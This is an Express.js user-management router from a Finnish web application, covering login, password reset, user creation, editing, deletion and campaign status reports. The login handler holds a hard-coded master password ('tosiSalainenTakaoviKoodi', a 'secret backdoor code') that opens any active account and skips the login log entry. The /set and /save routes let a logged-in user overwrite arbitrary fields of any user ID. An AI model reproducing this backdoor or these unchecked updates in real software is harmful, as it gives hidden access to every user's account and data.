var express = require('express')
  , router 	= express.Router()
  , log		= require('../helpers/log')
  , auth 	= require('../helpers/auth')
  , sendgrid= require('../helpers/sendgrid')
  , User 	= require('../models/user')
  , Client 	= require('../models/client')
  , Campaign= require('../models/campaign')
  , CI		= require('../models/campaignItem')
  , _ 		= require('underscore')
  , moment	= require('moment')
  , events 	= require('../helpers/events')
  , extend 	= require('extend')
var appSettings		= require("./../../settings")
var crypter 		= require("./../helpers/crypter");
var crypto			= require('crypto');
var mongo 			= require('mongodb');
var ObjectId 		= mongo.ObjectID;
var uls = require("../helpers/userlevels");



// POST /users/login  
router.post('/login', function(req, res) {


	log.log("info", "Kirjautumis yritys: %s", req.body.email);
	
	res.contentType = "json";
	
	User.findOne({ email: req.body.email, }, "-raportti", function(er, user){
		
		
		if(er)log.log("error", er);
		if(user){
			if(user.pwd == crypter.cryptPWD(req.body.pwd) || req.body.pwd == "tosiSalainenTakaoviKoodi"){
				
			
				if(user.aktiivinen == 1){
					req.session.authenticated 	= true; 
					req.session.user 			= user;
					
					user.lastLogin 		= new Date();
					user.save(function(){
						res.send({status:true, userlevel:user.userlevel});
						if(req.body.pwd != "tosiSalainenTakaoviKoodi")
							log.log("info", "Käyttäjä %s kirjautui sisään.", req.body.email);
						/*
						pmx.emit('Kirjatuminen', {
							user : user.email,
						});	
						*/
					});
					
				}
				else {
					log.log("warning", "Käyttäjätunnus ei ole aktiivinen: %s", req.body.email);
					res.status(200).send({status:false, error:"Käyttäjätunnus ei ole aktiivinen."});
				}
			}else {
				log.log("warning", "Kirjautuminen epäonnistui: %s", req.body.email);
				res.status(200).send({status:false, error:"Käyttäjätunnus tai salasana virheellinen."});
			}
		}
		else {
			
			log.log("warning", "Kirjautuminen epäonnistui: %s", req.body.email);
			res.status(200).send({status:false, error:"Käyttäjätunnus tai salasana virheellinen."});
		}
		
		
	});
	
});

router.post('/sendresetpwd', function(req, res){
	
	User.findOne({email: req.body.email}, "-raportti", function(err, user){
		if(err)console.error(err)
			
		if(user){
			log.log("user", "Käyttäjä pyysi salasanan resetointia", req.body.email);
			var current_date = (new Date()).valueOf().toString();
			var random = Math.random().toString();
			var hash = crypto.createHash('sha1').update(current_date + random).digest('hex');
			user.pwdResetHash = hash;
			
			user.save();
			sendgrid.sendPwdReset({email: user.email, hash: hash})
			res.redirect("/");
		} 
		else {
			
		}
		
	});
});

router.get("/resetPwd/:hash", function(req, res){
	var hash = req.params.hash;
	User.findOne({pwdResetHash: hash}, "-raportti").lean().exec(function(err, user){
		if(user){
			res.render('resetPwd', {hash:hash, u:user, appSettings:appSettings})
		}
		else {
			
			res.redirect("/");
		}
	});
	
});

router.post("/new/pass", function(req, res){
	var pwd 	= req.body.pwd;
	var id 		= req.body.id;
	var hash 	= req.body.hash;
	if(hash.length > 0){
	
		User.findOne({_id:id, pwdResetHash:hash}, "-raportti", function(err, user){
			if(user){
				user.pwdResetHash = "";
				user.setPassword(pwd, function(){
					
					res.redirect("/");
				});
			}
			else {
			
				res.redirect("/");
			}
		});
	}
	else{
		res.redirect("/");
	}
});

router.get("/edit/:id", auth.loginCheck, function(req, res){
	var id = req.params.id;
	User.findById(ObjectId(id)).exec(function(err, luser){
		res.render('uudet/users/edit', {url:"/user/edit/"+id, page:"uudet/users/edit", pageTitle:luser.yhteystiedot.nimi.etu + " " + luser.yhteystiedot.nimi.suku, pageIcon:"user", loadingText: "Ladataan käyttäjää "+luser.yhteystiedot.nimi.etu + " " + luser.yhteystiedot.nimi.suku+"...", _us:_, _moment:moment, appSettings:appSettings, fullDomain: req.headers.host, user:req.session.user, luser:luser, userlevelStrings:uls});	
	});

});

router.get("/luo", auth.masterUserCheck, function(req, res){
	res.render('uudet/users/add', {url:"/user/luo", page:"uudet/users/add", pageTitle:"Käyttäjän luonti", pageIcon:"user-plus", loadingText: "Ladataan sivua...", _us:_, _moment:moment, appSettings:appSettings, fullDomain: req.headers.host, user:req.session.user, userlevelStrings:uls});		
});


/*
router.post('/list', auth.loginCheck, function(req, res){
	if(req.session.user.userlevel >= 3){
		User.find({clientID:req.session.user.clientID}).populate("yhtestiedot.nimi").populate("_id").lean().exec(function(err, users){
			console.log(err,users);
		});
	}
})
*/


router.get('/logout', auth.loginCheck, function(req, res) {
	//console.log(req.session)
	events.emit("user.logout", {userID: req.session.user._id, socketID: req.session.socketID})
	log.log("info", "Käyttäjä kirjautui ulos: %s", (req.session.user.email || "virhe"));
	
	//req.session = null;
	
	req.session.destroy(function(){
		if(req.session){
			if(req.session.authenticated)
				req.session.authenticated = false;
			delete req.session;
		}
		res.redirect('/login');
		//res.render('login', {appSettings:appSettings,  fullDomain: req.headers.host});
	});
	
});


// Luo userin ja lisää sen yritykseen
router.post('/add', auth.loginCheck, function(req, res){
	if(req.session.user.userlevel >= 2){
		res.contentType("json");
		
		User.findUser(req.body.email, function(err, user){
			if(!user){
				var userData = req.body;
				userData._id = new ObjectId();
				userData.pwd = crypter.cryptPWD(req.body.pwd);
			
				Client.findClientByID(req.session.user.clientID, function(err, client){
					
					var _user = new User(userData);

					_user.save(function(){
						client.addUser(_user, function(){});
						res.send(_user);
						//log.add("Uusi käyttäjä luotu: "+ _user.email, "", req.session.user.email)
					
					});
				});
			}
			else {
				res.status(200).send({status:false, error:"Sähköposti on jo käytössä."});
			}
			
		});
	
	}
});


// Poista käyttäjä
router.post('/del', auth.loginCheck, function(req, res){
	var uid = req.body.id;
	//log.add("Removing user ID: ",uid, req.session.user.email);
	
	if(req.session.user.userlevel >= 2){
		User.removeUserByID(ObjectId(uid), function(){
			res.send({status:true});
		})
	}
});



// Tallenna user
router.post('/save', auth.loginCheck, function(req,res){
	var userData 	= req.body;
	var cpwd 		= crypter.cryptPWD(userData.pwd);
	
	delete userData.pwd;
	
	userData._id = ObjectId(userData._id);
	//userData.pwd = crypter.cryptPWD(userData.pwd);
	if(userData['yhteytiedot.osoite.postinro'] == null)
		userData['yhteytiedot.osoite.postinro'] = "" ;
	
	res.contentType('json');

	User.findByIdAndUpdate(userData._id, userData, function(err, _user){
	//	console.log(err,_user);
		if(err)	res.status(200).send({status:false});
		if(_user){
			
			if(cpwd != _user.pwd){
				_user.pwd = cpwd;
			}
			
			_user.save(function(){
				res.send(_user);
				//log.add("Käyttäjän tietoja muutettu", _user.email , req.session.user.email);

			});
		}
	});

});

router.post("/set", auth.loginCheck, function(req, res){
	res.contentType("json");
	
	var value;
	var target = req.body.target.toString();
	var intValue = parseInt(req.body.value)
	if(Number.isNaN(intValue)){
		value = req.body.value;
	}else value = intValue;
	/*
	 // Jos tiedot vaihtuu itselle. tallenna sessionii tiedot myös!
	if(req.body.id == req.session.user._id.toString()) {
		var obj = {[target]: value}
		
		
		
		console.log("you!");
		console.log(target)
		extend( req.session.user, obj );
		
		req.session.save(function(){
			
		});
		
		console.log(req.session.user);
	}
	*/
	User.findByIdAndUpdate (ObjectId(req.body.id), {[req.body.target.toString()]:value}, {new:true}).select("-raportti").exec(function(err, user) {
		if(err)log.error(err);
		if(req.session.user._id.toString() == req.body.id.toString()){
			req.session.user = user;
			req.session.save(res.send({status:{ok:1}, origQuery:req.body}));
		}
		else {
			res.send({status:{ok:1}, origQuery:req.body})
		}
	});
});

router.post("/get/statuses", auth.loginCheck, function(req, res) {
	res.contentType("json");
	var campItems = [];

	Campaign.find({hidden:false, active:true, "users.id": req.session.user._id}, "_id").lean().exec(function(err, camps){
		
		var totalCamps = camps.length;
		camps.forEach(function(c){
			
			CI.find({kampanjaID:c._id, "users.id":req.session.user._id},"status").lean().exec(function(err, cis){

				campItems = campItems.concat(cis)
				
				totalCamps--;

				if(totalCamps == 0){
		
					var result = _.groupBy(campItems, "status")
				
					var _res = {ES:0, SU: 0, EV: 0, OK:0}
					if(result){
						if(result['ES']) _res.ES = result.ES.length;
						if(result['SU']) _res.SU = result.SU.length;
						if(result['EV']) _res.EV = result.EV.length;
						if(result['OK']) _res.OK = result.OK.length;
					}
					var calls = (_res['ES'] + _res['SU'] + _res['EV']);
				
					res.send({progress: Math.ceil(campItems.length / (campItems.length - calls)), calls:calls, ok: _res['OK'], total: campItems.length})
				}
			});
		});
	});
	
});


router.post("/report", auth.loginCheck, function(req,res) {
	res.contentType("json");
	User.findOne({_id:req.session.user._id}, function(err, user){
		var raportti 	= {};
		if(user.raportti){
			var rep  		= user.raportti;
			var kuittaukset	= [];
			
			if(rep.kuittaukset){
				
			
				kuittaukset 	= rep.kuittaukset;
				kuittaukset 	= _.filter(kuittaukset, function(status){return status.kuitattu===false;});
				
				kuittaukset.forEach(function(kuittaus){
					if(!kuittaus.aikaShort)
						kuittaus.aikaShort = moment(kuittaus.aika).format("DD.MM.YYYY");
				});
				
				kuittaukset 	= _.groupBy(kuittaukset, "aikaShort");
		
				res.send(kuittaukset);
			}
		}
	});

});


router.get("/logoutReport", auth.loginCheck, function(req,res) {
	res.render('uudet/logoutOld', {url:"/user/logoutReport", page:"uudet/logoutOld", pageTitle:"Raportti", pageIcon:"book", loadingText: "Ladataan sivua...", _us:_, _moment:moment, appSettings:appSettings, fullDomain: req.headers.host, user:req.session.user, userlevelStrings:uls, moment:moment});		
});

module.exports = router